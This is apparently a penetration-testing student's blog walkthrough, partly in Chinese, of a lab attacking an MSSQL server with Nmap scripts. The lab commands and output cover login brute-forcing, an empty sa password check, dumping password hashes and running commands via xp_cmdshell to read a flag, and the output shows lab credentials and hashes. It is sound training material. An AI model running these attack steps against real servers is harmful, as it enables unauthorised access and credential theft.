---
layout: post
title: "MSSQL Nmap Scripts"
date: "2022-08-27"
author: "r3kind1e"
header-img: "img/post-bg-Penetration Testing Student.png"
catalog:    true
tags: 
    - Penetration Testing Student v2
    - Assessment Methodologies
    - Enumeration
---

# MSSQL Nmap Scripts
```
Target IP Address: 10.4.25.137
```

```
nmap 10.4.25.137

PORT        STATE   SERVICE
135/tcp     open    msrpc
139/tcp     open    netbios-ssn
445/tcp     open    microsoft-ds
1433/tcp    open    ms-sql-s
3389/tcp    open    ms-wbt-server
```

```
nmap 10.4.25.137 -p 1433 -sV

PORT        STATE   SERVICE     VERSION
1433/tcp    open    ms-sql-s    Microsoft SQL Server 2019 15.00.2000
```

[ms-sql-info](https://nmap.org/nsedoc/scripts/ms-sql-info.html)

尝试确定 Microsoft SQL Server 实例的配置和版本信息。

```
nmap 10.4.25.137 -p 1433 --script ms-sql-info
```

[ms-sql-ntlm-info](https://nmap.org/nsedoc/scripts/ms-sql-ntlm-info.html)

此脚本枚举来自启用 NTLM 身份验证的远程 Microsoft SQL 服务的信息。

使用无效域和空凭据发送 MS-TDS NTLM 身份验证请求将导致远程服务以 NTLMSSP 消息进行响应，该消息披露包括 NetBIOS、DNS 和操作系统构建版本的信息。

```
nmap 10.4.25.137 -p 1433 --script ms-sql-ntlm-info --script-args mssql.instance-port=1433
```

[ms-sql-brute](https://nmap.org/nsedoc/scripts/ms-sql-brute.html)

对 Microsoft SQL Server (ms-sql) 执行密码猜测。与broadcast-ms-sql-discover脚本结合使用效果最佳。

```
nmap 10.4.25.137 -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt
```

[ms-sql-empty-password](https://nmap.org/nsedoc/scripts/ms-sql-empty-password.html)

尝试使用 sysadmin (sa) 帐户的空密码向 Microsoft SQL Server 进行身份验证。

```
nmap 10.4.25.137 -p 1433 --script ms-sql-empty-password
```

[ms-sql-query](https://nmap.org/nsedoc/scripts/ms-sql-query.html)

针对 Microsoft SQL Server (ms-sql) 运行查询。

```
nmap 10.4.25.137 -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" -oN output.txt
```

在文件管理器中打开`/root/output.txt`

[ms-sql-dump-hashes](https://nmap.org/nsedoc/scripts/ms-sql-dump-hashes.html)

以适合 John-the-ripper 等工具破解的格式从 MS-SQL 服务器转储密码哈希。为此，用户需要具有适当的数据库权限。

作为脚本参数传递的凭据优先于其他脚本发现的凭据。

```
nmap 10.4.25.137 -p 1433 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
```

[ms-sql-xp-cmdshell](https://nmap.org/nsedoc/scripts/ms-sql-xp-cmdshell.html)

尝试使用 Microsoft SQL Server (ms-sql) 的命令外壳运行命令。

该脚本需要一个具有 sysadmin 服务器角色的帐户才能工作。

运行时，脚本会遍历凭据并尝试运行命令，直到所有凭据都用尽或执行命令。

```
nmap 10.4.25.137 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="ipconfig"
```

```
nmap 10.4.25.137 -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type c:\flag.txt"
```

# Recon: MSSQL: Nmap Scripts（侦察：MSSQL：Nmap 脚本）
## 概述
为您提供了一台 Kali GUI 机器和一台运行 MSSQL 服务的目标机器。目标机器的 IP 地址在 Kali 机器桌面 (/root/Desktop/target) 上名为 target 的文本文件中提供。 

你的任务是使用 Kali 机器上可用的工具对服务进行指纹识别，并运行 Nmap 脚本来枚举 Windows 目标机器的 MSSQL 服务。

客观的： 

1. 识别 MSSQL 数据库服务器
2. 使用 NTLM 从 MSSQL 服务器中查找信息。
3. 枚举所有有效的 MSSQL 用户和密码
4. 识别“sa”用户密码
5. 执行 MSSQL 查询以提取 sysusers
6. 转储 MSSQL 用户哈希
7. 在 MSSQL 上执行命令以检索标志。（标志位于 C:\flag.txt 内）

指示：

* 你的 Kali 机器有一个 IP 地址为 10.10.XY 的接口运行“ip addr”以了解 X 和 Y 的值。
* 目标机器的 IP 地址在文件“/root/Desktop/target”中提到
* 不要攻击位于 IP 地址 192.VW1 和 10.10.X.1 的网关

## 我自己的思路
A Kali GUI machine and a target machine running an MSSQL service are provided to you. The IP address of the target machine is provided in a text file named target placed on the Desktop of the Kali machine (/root/Desktop/target). 

Your task is to fingerprint the service using the tools available on the Kali machine and run Nmap scripts to enumerate the Windows target machine MSSQL service.

```
Target IP Address : 10.0.27.132
```

```
root@attackdefense:~# nmap 10.0.27.132
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 09:06 IST
Nmap scan report for 10.0.27.132
Host is up (0.0028s latency).
Not shown: 995 closed ports
PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
1433/tcp open  ms-sql-s
3389/tcp open  ms-wbt-server

Nmap done: 1 IP address (1 host up) scanned in 2.63 seconds

```

Objective: 

Identify MSSQL Database Server

`Microsoft SQL Server 2019 RTM`

```
root@attackdefense:~# nmap 10.0.27.132 -p 1433 -sV
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 09:08 IST
Nmap scan report for 10.0.27.132
Host is up (0.0032s latency).

PORT     STATE SERVICE  VERSION
1433/tcp open  ms-sql-s Microsoft SQL Server 2019 15.00.2000

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.56 seconds

```

```
root@attackdefense:~# nmap -p 1433 --script ms-sql-info --script-args mssql.instance-port=1433 10.0.27.132
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 09:15 IST
Nmap scan report for 10.0.27.132
Host is up (0.0033s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s

Host script results:
| ms-sql-info: 
|   10.0.27.132:1433: 
|     Version: 
|       name: Microsoft SQL Server 2019 RTM
|       number: 15.00.2000.00
|       Product: Microsoft SQL Server 2019
|       Service pack level: RTM
|       Post-SP patches applied: false
|_    TCP port: 1433

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds
```

Find information from the MSSQL server with NTLM.

```
root@attackdefense:~# nmap -p 1433 --script ms-sql-ntlm-info 10.0.27.132
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 09:19 IST
Nmap scan report for 10.0.27.132
Host is up (0.0033s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-ntlm-info: 
|   Target_Name: MSSQL-SERVER
|   NetBIOS_Domain_Name: MSSQL-SERVER
|   NetBIOS_Computer_Name: MSSQL-SERVER
|   DNS_Domain_Name: MSSQL-Server
|   DNS_Computer_Name: MSSQL-Server
|_  Product_Version: 10.0.14393

Nmap done: 1 IP address (1 host up) scanned in 0.43 seconds

```

Enumerate all valid MSSQL users and passwords

```
dbadmin:bubbles1
auditor:jasmine1
admin:anamaria
```

```
root@attackdefense:~# nmap -p 1433 --script ms-sql-brute --script-args userdb=/root/Desktop/wordlist/common_users.txt,passdb=/root/Desktop/wordlist/100-common-passwords.txt 10.0.27.132
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 09:26 IST
Nmap scan report for 10.0.27.132
Host is up (0.0031s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-brute: 
|   [10.0.27.132:1433]
|     Credentials found:
|       dbadmin:bubbles1 => Login Success
|       auditor:jasmine1 => Login Success
|_      admin:anamaria => Login Success

Nmap done: 1 IP address (1 host up) scanned in 4.17 seconds

```

Identify 'sa' user password

`sa:<empty>`

```
root@attackdefense:~# nmap -p 1433 --script ms-sql-empty-password 10.0.27.132
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 09:41 IST
Nmap scan report for 10.0.27.132
Host is up (0.0031s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-empty-password: 
|   [10.0.27.132:1433]
|_    sa:<empty> => Login Success

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

Execute MSSQL query to extract sysusers

```
##MS_SQLResourceSigningCertificate##
##MS_SQLReplicationSigningCertificate##
##MS_SQLAuthenticatorCertificate##
##MS_PolicySigningCertificate##
##MS_SmoExtendedSigningCertificate##
##MS_PolicyEventProcessingLogin##
##MS_PolicyTsqlExecutionLogin##
##MS_AgentSigningCertificate##
EC2AMAZ-5861GL6\Administrator
NT SERVICE\SQLWriter
NT SERVICE\Winmgmt
NT Service\MSSQL$SQLEXPRESS
BUILTIN\Users
NT AUTHORITY\SYSTEM
NT SERVICE\SQLTELEMETRY$SQLEXPRESS
admin
Mssql
Mssqla
auditor
dbadmin
```

```
root@attackdefense:~# nmap -p 1433 --script ms-sql-query --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-query.query="SELECT * FROM master..syslogins" 10.0.27.132 -oN output.txt
```

```
# Nmap 7.91 scan initiated Sat Aug 27 09:34:51 2022 as: nmap -p 1433 --script ms-sql-query --script-args "mssql.username=admin,mssql.password=anamaria,ms-sql-query.query=SELECT * FROM master..syslogins" -oN output.txt 10.0.27.132
Nmap scan report for 10.0.27.132
Host is up (0.0031s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-query: 
|   [10.0.27.132:1433]
|     Query: SELECT * FROM master..syslogins
|       sid	status	createdate	updatedate	accdate	totcpu	totio	spacelimit	timelimit	resultlimit	name	dbname	password	language	denylogin	hasaccess	isntname	isntgroup	isntuser	sysadmin	securityadmin	serveradmin	setupadmin	processadmin	diskadmin	dbcreator	bulkadmin	loginname
|       ===	======	==========	==========	=======	======	=====	==========	=========	===========	====	======	========	========	=========	=========	========	=========	========	========	=============	===========	==========	============	=========	=========	=========	=========
|       0x01	9	2003-04-08T03:40:35	2021-01-21T04:50:57	2003-04-08T03:40:35	0	0	0	0	0	sa	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	sa
|       0x0106000000000009010000001e501960278b270fd34191426bf0193fc0b4e786	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLResourceSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLResourceSigningCertificate##
|       0x010600000000000901000000ed1b6318a0592d96ce6d143a9184be0f758287be	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLReplicationSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLReplicationSigningCertificate##
|       0x010600000000000901000000fb236d83a8dc8e7de549c56382c1a25f85ea3704	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SQLAuthenticatorCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SQLAuthenticatorCertificate##
|       0x010600000000000901000000bb1b6130e13e5b67b7bd49ce40730a5b67188088	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_PolicySigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicySigningCertificate##
|       0x010600000000000901000000dcfdce5b748d5515e793fc84e1eccbe22a187f7a	10	2019-09-24T08:51:16	2019-09-24T08:51:16	2019-09-24T08:51:16	0	0	0	0	0	##MS_SmoExtendedSigningCertificate##	master	Null	Null	0	0	0	0	0	0	0	0	0	0	0	0	0	##MS_SmoExtendedSigningCertificate##
|       0x5681cce7a1f1ff41b2f95ced7d792e70	9	2019-09-24T08:51:53	2021-01-20T01:47:08	2019-09-24T08:51:53	0	0	0	0	0	##MS_PolicyEventProcessingLogin##	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicyEventProcessingLogin##
|       0x27578d8516843e4094efa2ceed085c82	9	2019-09-24T08:51:53	2021-01-20T01:47:08	2019-09-24T08:51:53	0	0	0	0	0	##MS_PolicyTsqlExecutionLogin##	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	##MS_PolicyTsqlExecutionLogin##
|       0x0106000000000009010000004c1967c27feb2ead332894c5a0779eae202847c8	9	2019-09-24T08:51:58	2019-09-24T08:51:58	2019-09-24T08:51:58	0	0	0	0	0	##MS_AgentSigningCertificate##	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	##MS_AgentSigningCertificate##
|       0x010500000000000515000000cf4b5eb619bca0ed968e21eff4010000	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	EC2AMAZ-5861GL6\Administrator	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	EC2AMAZ-5861GL6\Administrator
|       0x010600000000000550000000732b9753646ef90356745cb675c3aa6cd6b4d28b	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT SERVICE\SQLWriter	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT SERVICE\SQLWriter
|       0x0106000000000005500000005a048ddff9c7430ab450d4e7477a2172ab4170f4	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT SERVICE\Winmgmt	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT SERVICE\Winmgmt
|       0x010600000000000550000000703344e71d40b7ffb8844562a9e3c7d4fd9771d8	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	NT Service\MSSQL$SQLEXPRESS	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT Service\MSSQL$SQLEXPRESS
|       0x01020000000000052000000021020000	9	2021-01-20T01:47:08	2021-01-20T01:47:08	2021-01-20T01:47:08	0	0	0	0	0	BUILTIN\Users	master	Null	us_english	0	1	1	1	0	0	0	0	0	0	0	0	0	BUILTIN\Users
|       0x010100000000000512000000	9	2021-01-20T01:47:08	2021-01-20T02:50:35	2021-01-20T01:47:08	0	0	0	0	0	NT AUTHORITY\SYSTEM	master	Null	us_english	0	1	1	0	1	1	0	0	0	0	0	0	0	NT AUTHORITY\SYSTEM
|       0x0106000000000005500000002c4559766def9a2f8e23ea83ae7c7f71254cb2cc	9	2021-01-20T01:47:09	2021-01-20T01:47:09	2021-01-20T01:47:09	0	0	0	0	0	NT SERVICE\SQLTELEMETRY$SQLEXPRESS	master	Null	us_english	0	1	1	0	1	0	0	0	0	0	0	0	0	NT SERVICE\SQLTELEMETRY$SQLEXPRESS
|       0x4a84b80919150844b881d1c2fead7f03	9	2021-01-20T02:48:23	2021-01-20T02:48:23	2021-01-20T02:48:23	0	0	0	0	0	admin	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	admin
|       0xc923586600ca1d40a00bcea3f83cf029	9	2021-01-20T02:50:33	2021-01-20T02:50:36	2021-01-20T02:50:33	0	0	0	0	0	Mssql	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	Mssql
|       0xdab05f73c5a136409081bc4dd4bb1173	9	2021-01-20T03:01:26	2021-01-20T03:15:57	2021-01-20T03:01:26	0	0	0	0	0	Mssqla	master	Null	us_english	0	1	0	0	0	1	0	0	0	0	0	0	0	Mssqla
|       0x09f200d8751d4040b72ae7bd09a43fe0	9	2021-01-20T03:31:14	2021-01-20T03:31:14	2021-01-20T03:31:14	0	0	0	0	0	auditor	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	auditor
|_      0x1f80eace64083c4598d9fc5c34060c84	9	2021-01-20T03:31:47	2021-01-20T03:31:47	2021-01-20T03:31:47	0	0	0	0	0	dbadmin	master	Null	us_english	0	1	0	0	0	0	0	0	0	0	0	0	0	dbadmin

# Nmap done at Sat Aug 27 09:34:52 2022 -- 1 IP address (1 host up) scanned in 0.42 seconds

```

Dump MSSQL users hashes

```
root@attackdefense:~# nmap -p 1433 10.0.27.132 --script ms-sql-dump-hashes --script-args mssql.username=admin,mssql.password=anamaria
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 09:53 IST
Nmap scan report for 10.0.27.132
Host is up (0.0028s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-dump-hashes: 
| [10.0.27.132:1433]
|     sa:0x020011dbfaf35ba0d5e61a769e3604230fde23e5d3e01e7ff0ba3875cf75554803e2f1e1977b78de8f4489c95df9be979c02f1dec551300c109c408c427934815755b600c7e0
|     ##MS_PolicyEventProcessingLogin##:0x0200191cf079f310fb475527ac320aba7a4e8d5c3567bef2462b96ce8a8629b7f986ed344aa0963ac3a096da77056dad77a457644431282e2aa2c2243bc635abc6bb5f52552c
|     ##MS_PolicyTsqlExecutionLogin##:0x0200677385acfe08bb1119246cf20f9d17c3a0d86bbb1d48874725f2c2e0e021260b885d0ba067427e09afad9079e6759ad6497ee7f1ef3cd497d500585d7727eeba64426083
|     admin:0x02003814edd67dcab815b733d877a0fe7ec3470185864bd673c7273ba76c31e000c15e9fae25a826f6ba03892e37d6a1acae17f171d21dad7b20d874ccc259bbf9fa2230b9c0
|     Mssql:0x02001786154bb350ac708b5a4c3fc6b90dc68418a13ba5fcb76b155f8eee14d72988edb559d9a2d0d6fd5dd25b1fab8431c0ca424d747a5743624c30aa772b40c8f23c66e6a4
|     Mssqla:0x0200987f06858112a7fa0c70fe3f53c64061b35ae864782fc9cfcda3954ed60ca7e47e8497a571d177edb596f125cb529d7b2753e4d8e913c2b127a12207e3bcb75f70e29cb5
|     auditor:0x020061cbe8509dfea47fbc20be854c4ac517bf6aa67f9f7c12d7d1efb1f500be279643c6cd19d370f9eff4f2d9b981a16f6916bc4534e8ba42d718f8b908fbfffb40d5cc1a5e
|_    dbadmin:0x02000d6c6a0d55f536f9dbff2d8cc1e0965c550e1a1a1e7c6df8b7e6534ab817408f86dd9592b206862c4b7a3d1f6ca85f439360171d7c5143d6fba8606675dbaf5bea40d15b

Nmap done: 1 IP address (1 host up) scanned in 0.44 seconds

```

Execute a command on MSSQL to retrieve the flag. (The flag is located inside C:\flag.txt)

```
Target IP Address : 10.0.19.44
```

```
root@attackdefense:~# nmap -p 1433 --script ms-sql-xp-cmdshell --script-args mssql.username=admin,mssql.password=anamaria,ms-sql-xp-cmdshell.cmd="type C:\flag.txt" 10.0.19.44
Starting Nmap 7.91 ( https://nmap.org ) at 2022-08-27 10:49 IST
Nmap scan report for 10.0.19.44
Host is up (0.0034s latency).

PORT     STATE SERVICE
1433/tcp open  ms-sql-s
| ms-sql-xp-cmdshell: 
|   [10.0.19.44:1433]
|     Command: type C:\flag.txt
|       output
|       ======
|_      1d1803570245aa620446518b2154f324

Nmap done: 1 IP address (1 host up) scanned in 0.46 seconds

```

## 解决方案
此实验室的解决方案可在以下手册中找到：https://assets.ine.com/labs/ad-manuals/walkthrough-2313.pdf

[MSSQL](https://www.microsoft.com/en-in/sql-server/sql-server-2019)
